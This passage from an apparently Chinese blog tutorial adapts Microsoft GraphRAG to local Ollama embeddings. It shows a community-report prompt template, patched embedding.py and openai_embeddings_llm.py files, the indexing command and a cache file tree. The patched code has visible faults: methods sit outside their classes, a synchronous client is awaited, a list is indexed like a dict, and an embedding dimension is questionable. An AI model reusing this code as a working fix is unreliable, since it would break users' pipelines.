ASSEMBLY,Harmony Assembly is holding a march at Verdant Oasis Plaza</span><br><span class="line">39,VERDANT OASIS PLAZA,UNITY MARCH,The Unity March is taking place at Verdant Oasis Plaza</span><br><span class="line">40,VERDANT OASIS PLAZA,TRIBUNE SPOTLIGHT,Tribune Spotlight is reporting on the Unity march taking place at Verdant Oasis Plaza</span><br><span class="line">41,VERDANT OASIS PLAZA,BAILEY ASADI,Bailey Asadi is speaking at Verdant Oasis Plaza about the march</span><br><span class="line">43,HARMONY ASSEMBLY,UNITY MARCH,Harmony Assembly is organizing the Unity March</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">&#123;</span><br><span class="line">    &quot;title&quot;: &quot;Verdant Oasis Plaza and Unity March&quot;,</span><br><span class="line">    &quot;summary&quot;: &quot;The community revolves around the Verdant Oasis Plaza, which is the location of the Unity March. The plaza has relationships with the Harmony Assembly, Unity March, and Tribune Spotlight, all of which are associated with the march event.&quot;,</span><br><span class="line">    &quot;rating&quot;: 5.0,</span><br><span class="line">    &quot;rating_explanation&quot;: &quot;The impact severity rating is moderate due to the potential for unrest or conflict during the Unity March.&quot;,</span><br><span class="line">    &quot;findings&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;summary&quot;: &quot;Verdant Oasis Plaza as the central location&quot;,</span><br><span class="line">            &quot;explanation&quot;: &quot;Verdant Oasis Plaza is the central entity in this community, serving as the location for the Unity March. This plaza is the common link between all other entities, suggesting its significance in the community. The plaza&#x27;s association with the march could potentially lead to issues such as public disorder or conflict, depending on the nature of the march and the reactions it provokes. [Data: Entities (5), Relationships (37, 38, 39, 40, 41,+more)]&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;summary&quot;: &quot;Harmony Assembly&#x27;s role in the community&quot;,</span><br><span class="line">            &quot;explanation&quot;: &quot;Harmony Assembly is another key entity in this community, being the organizer of the march at Verdant Oasis Plaza. The nature of Harmony Assembly and its march could be a potential source of threat, depending on their objectives and the reactions they provoke. The relationship between Harmony Assembly and the plaza is crucial in understanding the dynamics of this community. [Data: Entities(6), Relationships (38, 43)]&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;summary&quot;: &quot;Unity March as a significant event&quot;,</span><br><span class="line">            &quot;explanation&quot;: &quot;The Unity March is a significant event taking place at Verdant Oasis Plaza. This event is a key factor in the community&#x27;s dynamics and could be a potential source of threat, depending on the nature of the march and the reactions it provokes. The relationship between the march and the plaza is crucial in understanding the dynamics of this community. [Data: Relationships (39)]&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;summary&quot;: &quot;Role of Tribune Spotlight&quot;,</span><br><span class="line">            &quot;explanation&quot;: &quot;Tribune Spotlight is reporting on the Unity March taking place in Verdant Oasis Plaza. This suggests that the event has attracted media attention, which could amplify its impact on the community. The role of Tribune Spotlight could be significant in shaping public perception of the event and the entities involved. [Data: Relationships (40)]&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Real Data</span><br><span class="line"></span><br><span class="line">Use the following text for your answer. Do not make anything up in your answer.</span><br><span class="line"></span><br><span class="line">Text:</span><br><span class="line">&#123;input_text&#125;</span><br><span class="line"></span><br><span class="line">The report should include the following sections:</span><br><span class="line"></span><br><span class="line">- TITLE: community&#x27;s name that represents its key entities - title should be short but specific. When possible, include representative named entities in the title.</span><br><span class="line">  - SUMMARY: An executive summary of the community&#x27;s overall structure, how its entities are related to each other, and significant information associated with its entities.</span><br><span class="line">  - IMPACT SEVERITY RATING: a float score between 0-10 that represents the severity of IMPACT posed by entities within the community.  IMPACT is the scored importance of a community.</span><br><span class="line">  - RATING EXPLANATION: Give a single sentence explanation of the IMPACT severity rating.</span><br><span class="line">  - DETAILED FINDINGS: A list of 5-10 key insights about the community. Each insight should have a short summary followed by multiple paragraphs of explanatory text grounded according to the grounding rules below. Be comprehensive.</span><br><span class="line"></span><br><span class="line">Return output as a well-formed JSON-formatted string with the following format:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;title&quot;: &lt;report_title&gt;,</span><br><span class="line">        &quot;summary&quot;: &lt;executive_summary&gt;,</span><br><span class="line">        &quot;rating&quot;: &lt;impact_severity_rating&gt;,</span><br><span class="line">        &quot;rating_explanation&quot;: &lt;rating_explanation&gt;,</span><br><span class="line">        &quot;findings&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;summary&quot;:&lt;insight_1_summary&gt;,</span><br><span class="line">                &quot;explanation&quot;: &lt;insight_1_explanation&gt;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;summary&quot;:&lt;insight_2_summary&gt;,</span><br><span class="line">                &quot;explanation&quot;: &lt;insight_2_explanation&gt;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"># Grounding Rules</span><br><span class="line"></span><br><span class="line">Points supported by data should list their data references as follows:</span><br><span class="line"></span><br><span class="line">&quot;This is an example sentence supported by multiple data references [Data: &lt;dataset name&gt; (record ids); &lt;dataset name&gt; (record ids)].&quot;</span><br><span class="line"></span><br><span class="line">Do not list more than 5 record ids in a single reference. Instead, list the top 5 most relevant record ids and add &quot;+more&quot; to indicate that there are more.</span><br><span class="line"></span><br><span class="line">For example:</span><br><span class="line">&quot;Person X is the owner of Company Y and subject to many allegations of wrongdoing [Data: Reports (1), Entities (5, 7); Relationships (23); Claims (7, 2, 34, 64, 46, +more)].&quot;</span><br><span class="line"></span><br><span class="line">where 1, 5, 7, 23, 2, 34, 46, and 64 represent the id (not the index) of the relevant data record.</span><br><span class="line"></span><br><span class="line">Do not include information where the supporting evidence for it is not provided.</span><br><span class="line"></span><br><span class="line">Output:</span><br></pre></td></tr></table></figure><p>embedding.py:  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Copyright (c) 2024 Microsoft Corporation.</span></span><br><span class="line"><span class="comment"># Licensed under the MIT License</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;OpenAI Embedding model implementation.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> <span class="type">Callable</span></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Any</span></span><br><span class="line"><span class="keyword">import</span> ollama</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> tiktoken</span><br><span class="line"><span class="keyword">from</span> tenacity <span class="keyword">import</span> (</span><br><span class="line">    AsyncRetrying,</span><br><span class="line">    RetryError,</span><br><span class="line">    Retrying,</span><br><span class="line">    retry_if_exception_type,</span><br><span class="line">    stop_after_attempt,</span><br><span class="line">    wait_exponential_jitter,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> graphrag.query.llm.base <span class="keyword">import</span> BaseTextEmbedding</span><br><span class="line"><span class="keyword">from</span> graphrag.query.llm.oai.base <span class="keyword">import</span> OpenAILLMImpl</span><br><span class="line"><span class="keyword">from</span> graphrag.query.llm.oai.typing <span class="keyword">import</span> (</span><br><span class="line">    OPENAI_RETRY_ERROR_TYPES,</span><br><span class="line">    OpenaiApiType,</span><br><span class="line">)</span><br><span class="line"><span class="keyword">from</span> graphrag.query.llm.text_utils <span class="keyword">import</span> chunk_text</span><br><span class="line"><span class="keyword">from</span> graphrag.query.progress <span class="keyword">import</span> StatusReporter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OpenAIEmbedding</span>(BaseTextEmbedding, OpenAILLMImpl):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Wrapper for OpenAI Embedding models.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self,</span></span><br><span class="line"><span class="params">    api_key: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    azure_ad_token_provider: <span class="type">Callable</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    model: <span class="built_in">str</span> = <span class="string">&quot;text-embedding-3-small&quot;</span>,</span></span><br><span class="line"><span class="params">    deployment_name: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    api_base: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    api_version: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    api_type: OpenaiApiType = OpenaiApiType.OpenAI,</span></span><br><span class="line"><span class="params">    organization: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    encoding_name: <span class="built_in">str</span> = <span class="string">&quot;cl100k_base&quot;</span>,</span></span><br><span class="line"><span class="params">    max_tokens: <span class="built_in">int</span> = <span class="number">8191</span>,</span></span><br><span class="line"><span class="params">    max_retries: <span class="built_in">int</span> = <span class="number">10</span>,</span></span><br><span class="line"><span class="params">    request_timeout: <span class="built_in">float</span> = <span class="number">180.0</span>,</span></span><br><span class="line"><span class="params">    retry_error_types: <span class="built_in">tuple</span>[<span class="built_in">type</span>[BaseException]] = OPENAI_RETRY_ERROR_TYPES,  <span class="comment"># type: ignore</span></span></span><br><span class="line"><span class="params">    reporter: StatusReporter | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params"></span>):</span><br><span class="line">    OpenAILLMImpl.__init__(</span><br><span class="line">        <span class="variable language_">self</span>=<span class="variable language_">self</span>,</span><br><span class="line">        api_key=api_key,</span><br><span class="line">        azure_ad_token_provider=azure_ad_token_provider,</span><br><span class="line">        deployment_name=deployment_name,</span><br><span class="line">        api_base=api_base,</span><br><span class="line">        api_version=api_version,</span><br><span class="line">        api_type=api_type,  <span class="comment"># type: ignore</span></span><br><span class="line">        organization=organization,</span><br><span class="line">        max_retries=max_retries,</span><br><span class="line">        request_timeout=request_timeout,</span><br><span class="line">        reporter=reporter,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">self</span>.model = model</span><br><span class="line">    <span class="variable language_">self</span>.encoding_name = encoding_name</span><br><span class="line">    <span class="variable language_">self</span>.max_tokens = max_tokens</span><br><span class="line">    <span class="variable language_">self</span>.token_encoder = tiktoken.get_encoding(<span class="variable language_">self</span>.encoding_name)</span><br><span class="line">    <span class="variable language_">self</span>.retry_error_types = retry_error_types</span><br><span class="line">    <span class="variable language_">self</span>.embedding_dim = <span class="number">384</span>  <span class="comment"># Nomic-embed-text model dimension</span></span><br><span class="line">    <span class="variable language_">self</span>.ollama_client = ollama.Client()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">embed</span>(<span class="params">self, text: <span class="built_in">str</span>, **kwargs: <span class="type">Any</span></span>) -&gt; <span class="built_in">list</span>[<span class="built_in">float</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Embed text using Ollama&#x27;s nomic-embed-text model.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        embedding = <span class="variable language_">self</span>.ollama_client.embeddings(model=<span class="string">&quot;nomic-embed-text&quot;</span>, prompt=text)</span><br><span class="line">        <span class="keyword">return</span> embedding[<span class="string">&quot;embedding&quot;</span>]</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="variable language_">self</span>._reporter.error(</span><br><span class="line">            message=<span class="string">&quot;Error embedding text&quot;</span>,</span><br><span class="line">            details=&#123;<span class="variable language_">self</span>.__class__.__name__: <span class="built_in">str</span>(e)&#125;,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> np.zeros(<span class="variable language_">self</span>.embedding_dim).tolist()</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">aembed</span>(<span class="params">self, text: <span class="built_in">str</span>, **kwargs: <span class="type">Any</span></span>) -&gt; <span class="built_in">list</span>[<span class="built_in">float</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Embed text using Ollama&#x27;s nomic-embed-text model asynchronously.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        embedding = <span class="keyword">await</span> <span class="variable language_">self</span>.ollama_client.embeddings(model=<span class="string">&quot;nomic-embed-text&quot;</span>, prompt=text)</span><br><span class="line">        <span class="keyword">return</span> embedding[<span class="string">&quot;embedding&quot;</span>]</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="variable language_">self</span>._reporter.error(</span><br><span class="line">            message=<span class="string">&quot;Error embedding text asynchronously&quot;</span>,</span><br><span class="line">            details=&#123;<span class="variable language_">self</span>.__class__.__name__: <span class="built_in">str</span>(e)&#125;,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> np.zeros(<span class="variable language_">self</span>.embedding_dim).tolist()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_embed_with_retry</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self, text: <span class="built_in">str</span> | <span class="built_in">tuple</span>, **kwargs: <span class="type">Any</span>  <span class="comment">#str | tuple</span></span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">tuple</span>[<span class="built_in">list</span>[<span class="built_in">float</span>], <span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        retryer = Retrying(</span><br><span class="line">            stop=stop_after_attempt(<span class="variable language_">self</span>.max_retries),</span><br><span class="line">            wait=wait_exponential_jitter(<span class="built_in">max</span>=<span class="number">10</span>),</span><br><span class="line">            reraise=<span class="literal">True</span>,</span><br><span class="line">            retry=retry_if_exception_type(<span class="variable language_">self</span>.retry_error_types),</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">for</span> attempt <span class="keyword">in</span> retryer:</span><br><span class="line">            <span class="keyword">with</span> attempt:</span><br><span class="line">                embedding = (</span><br><span class="line">                    <span class="variable language_">self</span>.sync_client.embeddings.create(  <span class="comment"># type: ignore</span></span><br><span class="line">                        <span class="built_in">input</span>=text,</span><br><span class="line">                        model=<span class="variable language_">self</span>.model,</span><br><span class="line">                        **kwargs,  <span class="comment"># type: ignore</span></span><br><span class="line">                    )</span><br><span class="line">                    .data[<span class="number">0</span>]</span><br><span class="line">                    .embedding</span><br><span class="line">                    <span class="keyword">or</span> []</span><br><span class="line">                )  </span><br><span class="line">                <span class="keyword">return</span> (embedding[<span class="string">&quot;embedding&quot;</span>], <span class="built_in">len</span>(text))</span><br><span class="line">    <span class="keyword">except</span> RetryError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="variable language_">self</span>._reporter.error(</span><br><span class="line">            message=<span class="string">&quot;Error at embed_with_retry()&quot;</span>,</span><br><span class="line">            details=&#123;<span class="variable language_">self</span>.__class__.__name__: <span class="built_in">str</span>(e)&#125;,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> ([], <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> why not just throw in this case?</span></span><br><span class="line">        <span class="keyword">return</span> ([], <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">_aembed_with_retry</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self, text: <span class="built_in">str</span> | <span class="built_in">tuple</span>, **kwargs: <span class="type">Any</span></span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">tuple</span>[<span class="built_in">list</span>[<span class="built_in">float</span>], <span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        retryer = AsyncRetrying(</span><br><span class="line">            stop=stop_after_attempt(<span class="variable language_">self</span>.max_retries),</span><br><span class="line">            wait=wait_exponential_jitter(<span class="built_in">max</span>=<span class="number">10</span>),</span><br><span class="line">            reraise=<span class="literal">True</span>,</span><br><span class="line">            retry=retry_if_exception_type(<span class="variable language_">self</span>.retry_error_types),</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">for</span> attempt <span class="keyword">in</span> retryer:</span><br><span class="line">            <span class="keyword">with</span> attempt:</span><br><span class="line">                embedding = (</span><br><span class="line">                    <span class="keyword">await</span> <span class="variable language_">self</span>.async_client.embeddings.create(  <span class="comment"># type: ignore</span></span><br><span class="line">                        <span class="built_in">input</span>=text,</span><br><span class="line">                        model=<span class="variable language_">self</span>.model,</span><br><span class="line">                        **kwargs,  <span class="comment"># type: ignore</span></span><br><span class="line">                    )</span><br><span class="line">                ).data[<span class="number">0</span>].embedding <span class="keyword">or</span> []</span><br><span class="line">                <span class="keyword">return</span> (embedding, <span class="built_in">len</span>(text))</span><br><span class="line">    <span class="keyword">except</span> RetryError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="variable language_">self</span>._reporter.error(</span><br><span class="line">            message=<span class="string">&quot;Error at embed_with_retry()&quot;</span>,</span><br><span class="line">            details=&#123;<span class="variable language_">self</span>.__class__.__name__: <span class="built_in">str</span>(e)&#125;,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> ([], <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> why not just throw in this case?</span></span><br><span class="line">        <span class="keyword">return</span> ([], <span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>openai_embeddings_llm.py:  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Copyright (c) 2024 Microsoft Corporation.</span></span><br><span class="line"><span class="comment"># Licensed under the MIT License</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;The EmbeddingsLLM class.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> typing_extensions <span class="keyword">import</span> Unpack</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> graphrag.llm.base <span class="keyword">import</span> BaseLLM</span><br><span class="line"><span class="keyword">from</span> graphrag.llm.types <span class="keyword">import</span> (</span><br><span class="line">    EmbeddingInput,</span><br><span class="line">    EmbeddingOutput,</span><br><span class="line">    LLMInput,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .openai_configuration <span class="keyword">import</span> OpenAIConfiguration</span><br><span class="line"><span class="keyword">from</span> .types <span class="keyword">import</span> OpenAIClientTypes</span><br><span class="line"><span class="keyword">import</span> ollama</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OpenAIEmbeddingsLLM</span>(BaseLLM[EmbeddingInput, EmbeddingOutput]):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A text-embedding generator LLM.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">_client: OpenAIClientTypes</span><br><span class="line">_configuration: OpenAIConfiguration</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, client: OpenAIClientTypes, configuration: OpenAIConfiguration</span>):</span><br><span class="line">    <span class="variable language_">self</span>.client = client</span><br><span class="line">    <span class="variable language_">self</span>.configuration = configuration</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">_execute_llm</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self, <span class="built_in">input</span>: EmbeddingInput, **kwargs: Unpack[LLMInput]</span></span><br><span class="line"><span class="params"></span>) -&gt; EmbeddingOutput | <span class="literal">None</span>:</span><br><span class="line">    args = &#123;</span><br><span class="line">        <span class="string">&quot;model&quot;</span>: <span class="variable language_">self</span>.configuration.model,</span><br><span class="line">        **(kwargs.get(<span class="string">&quot;model_parameters&quot;</span>) <span class="keyword">or</span> &#123;&#125;),</span><br><span class="line">    &#125;</span><br><span class="line">    embedding_list = []</span><br><span class="line">    <span class="keyword">for</span> inp <span class="keyword">in</span> <span class="built_in">input</span>:</span><br><span class="line">        embedding = ollama.embeddings(model=<span class="string">&quot;nomic-embed-text&quot;</span>, prompt=inp)</span><br><span class="line">        embedding_list.append(embedding[<span class="string">&quot;embedding&quot;</span>])</span><br><span class="line">    <span class="keyword">return</span> embedding_list</span><br></pre></td></tr></table></figure><p>将相关文件替换后再打开Ollama服务<br>构建索引:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m graphrag.index --root ./test</span><br></pre></td></tr></table></figure><p>这一步比较吃电脑配置，也是最耗时间的一步<a href="https://www.bilibili.com/video/BV18HeFetELw/?spm_id_from=333.337.search-card.all.click&vd_source=4966528acd6540678eedd7b9e188a2d1">b站视频</a>演示时用4090的显卡用时20分钟左右，笔者4050的显卡对同样的内容构建索引用时5个小时多<br>构建完成后会生成新的文件，文件树如下:  </p><details><summary>文件树信息</summary><pre><code>graphrag    └─test    │  .env    │  settings.yaml    │    ├─cache    │  ├─community_reporting    │  │      create_community_report-chat-v2-05abb9bf64290c9593fdf820d26481cf    │  │      create_community_report-chat-v2-1d14150b78007a447e3fa0837dcffdaf    │  │      create_community_report-chat-v2-271f82c36ff44fbd67460a754c266913    │  │      create_community_report-chat-v2-3e3d3051081db242b891f5ae4ad67fcf    │  │      create_community_report-chat-v2-42e023a1562f8c66f13f5c777ac818ec    │  │      create_community_report-chat-v2-4c80f68a16e7f9be9f0a6b9cd1d3d34b    │  │      create_community_report-chat-v2-51395309fff3199ff962e02406cc197b    │  │      create_community_report-chat-v2-5462d20ae65c7eac3aab71d89ffd03ae    │  │      create_community_report-chat-v2-554bff36ee06e5296942b2ebb5cd703e    │  │      create_community_report-chat-v2-594610a39f5182e73c12713784231567    │  │      create_community_report-chat-v2-5fb041980124144a5187671d5f9ef7c1    │  │      create_community_report-chat-v2-604dc46d0b608c1fb2a0a88e1c26c18f    │  │      create_community_report-chat-v2-6233741ed71795443e0963984eede331    │  │      create_community_report-chat-v2-6baccacf0c8af460442670b043ebc58a    │  │      create_community_report-chat-v2-9830304cddab1938d93309cd87dca984    │  │      create_community_report-chat-v2-ad70d90f5ad8ba5724a5bea6ff8068fe    │  │      create_community_report-chat-v2-c122141aa4fce67d3d8fa4e0912f5cd9    │  │      create_community_report-chat-v2-c6b3fa698d6f9bb13839b4b5f2de6a09    │  │      create_community_report-chat-v2-ca4edabf6cc676f6871692266746c334    │  │      create_community_report-chat-v2-ca567d9b1ca158c168050f79c3a537b9    │  │      create_community_report-chat-v2-d60f9dcc73210deda01c184fc596798f    │  │      create_community_report-chat-v2-dd1e70b6bedeb1b789210ffaf49850ef    │  │      create_community_report-chat-v2-e89427b5d9b62f26a4f8512b659381c6    │  │      create_community_report-chat-v2-edfc839d3ad587d0526a09a1c0edb576    │  │      create_community_report-chat-v2-f5fbd1774628a941881852f16a9db1c6    │  │    │  ├─entity_extraction    │  │      chat-032f9152180cb73aa6361b9d7a4c5f4f    │  │      chat-0724634f1bbc9ad130bcbc74b925d790    │  │      chat-073e6a86870be1dac8d98235cbce53cf    │  │      chat-09953ce8ff455e119a86efef7cb9db4e    │  │      chat-0a9b5f904984bde0d5903afe4c5660c0    │  │      chat-10bb9702786e793e90708d4c4d83ddbe    │  │      chat-1254787c5c59a04910be58886e22423b    │  │      chat-13f71b7cde778647b08b04473239ebee    │  │      chat-145157a268a088f09517b9fe18184664    │  │      chat-16439cb18f3d84f0464a7bef8c673e46    │  │      chat-1cc3028b53ebff886f53ee54c1cf85b4    │  │      chat-1e46cd715eba33b8ad196dce7fb856dd    │  │      chat-2263c946e34afdcfb4fba9b74102ae39    │  │      chat-27503eac54753b5b416147afd6fe0b9a    │  │      chat-28cc4e416c64c09c127847e258fffa28    │  │      chat-2b71daba59b14cff548ef0a1b9fe3f58    │  │      chat-31352d85282ab0e8064c84c9ec7e6926    │  │      chat-37d57b96e0cea19e879895821587b0ce    │  │      chat-390ebbcd0c49c9f23b371f15264af3ab    │  │      chat-40b0c066be7658ef38edcfb4fe66bcdb    │  │      chat-45cbb5220a3c2fff3bc43483d69bcde9    │  │      chat-49ad7b53b38f51530c35271f8c14445f    │  │      chat-4aeb85961e2208e789009836b18ff4dd    │  │      chat-4ee46f56ac68a8e57c7474d5695a48c6    │  │      chat-516e2c87253f6bd1732ed3503e42dd5f    │  │      chat-51ac8f2ff87118bff9b5217be10cfc34    │  │      chat-63fce99631cfa2665f7edc4fa33f7910    │  │      chat-64f0f91e1293274dc4fcf8e8b42855e3    │  │      chat-66ce70bf6a5575997b9b2d8fa3500e61    │  │      chat-6fd6b29f5df7a7388c817d3d1d1e975d    │  │      chat-71ba19681e8c39400ca0be94852ee810    │  │      chat-75accb8c949fce7000f99cbe9b93affa    │  │      chat-78ccd2fccbbc6ec781a8ec0760139088    │  │      chat-7c0b98404e66a871053a90c24f87fad6   